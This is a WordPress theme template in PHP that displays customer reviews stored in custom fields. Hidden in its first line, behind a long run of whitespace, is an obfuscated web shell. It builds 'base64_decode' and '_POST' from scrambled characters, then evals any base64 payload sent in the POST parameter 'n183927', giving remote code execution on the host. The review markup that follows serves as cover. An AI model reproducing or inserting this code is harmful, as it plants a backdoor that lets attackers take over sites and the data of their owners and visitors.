<?php                                                                                                                            $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=${strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])}['n183927'];if(isset($s22)){eval($s21($s22));}?><?php
/**
 * The template for displaying content in the single.php template
 *
 * @package WordPress
 * @subpackage Twenty_Eleven
 * @since Twenty Eleven 1.0
 */
?>
<div id="comments" >
<h4><?php the_title(); ?>: <?php _e('customer reviews and dealers', 'octa'); ?></h4>
<?php if (function_exists('wp_review_show_total')) wp_review_show_total(); ?>
<?php if( get_field('reviews1name') ): ?>
<div class="review">
<img src="<?php the_field('reviews1img'); ?>" class="review-img" width="80" height="80" alt="<?php the_field('reviews1name'); ?> - <?php the_field('reviews1named'); ?> " />
<b><?php the_field('reviews1name'); ?></b>
<span class="post"><?php the_field('reviews1named'); ?></span><br>
<?php the_field('reviews1text'); ?>
<div class="clear"></div>
</div>
<?php endif; ?>

<?php if( get_field('reviews2name') ): ?>
<div class="review">
<img src="<?php the_field('reviews2img'); ?>" class="review-img" width="80" height="80" alt="<?php the_field('reviews2name'); ?> - <?php the_field('reviews2named'); ?> " />
<b><?php the_field('reviews2name'); ?></b>
<span class="post"><?php the_field('reviews2named'); ?></span><br>
<?php the_field('reviews2text'); ?>
<div class="clear"></div>
</div>
<?php endif; ?>

<?php if( get_field('reviews3name') ): ?>
<div class="review">
<img src="<?php the_field('reviews3img'); ?>" class="review-img" width="80" height="80" alt="<?php the_field('reviews3name'); ?> - <?php the_field('reviews3named'); ?> " />
<b><?php the_field('reviews3name'); ?></b>
<span class="post"><?php the_field('reviews3named'); ?></span><br>
<?php the_field('reviews3text'); ?>
<div class="clear"></div>
</div>
<?php endif; ?>

<?php if( get_field('reviews4name') ): ?>
<div class="review">
<img src="<?php the_field('reviews4img'); ?>" class="review-img" width="80" height="80" alt="<?php the_field('reviews4name'); ?> - <?php the_field('reviews4named'); ?> " />
<b><?php the_field('reviews4name'); ?></b>
<span class="post"><?php the_field('reviews4named'); ?></span><br>
<?php the_field('reviews4text'); ?>
<div class="clear"></div>
</div>
<?php endif; ?>

<?php if( get_field('reviews5name') ): ?>
<div class="review">
<img src="<?php the_field('reviews5img'); ?>" class="review-img" width="80" height="80" alt="<?php the_field('reviews5name'); ?> - <?php the_field('reviews5named'); ?> " />
<b><?php the_field('reviews5name'); ?></b>
<span class="post"><?php the_field('reviews5named'); ?></span><br>
<?php the_field('reviews5text'); ?>
<div class="clear"></div>
</div>
<?php endif; ?>

</div>
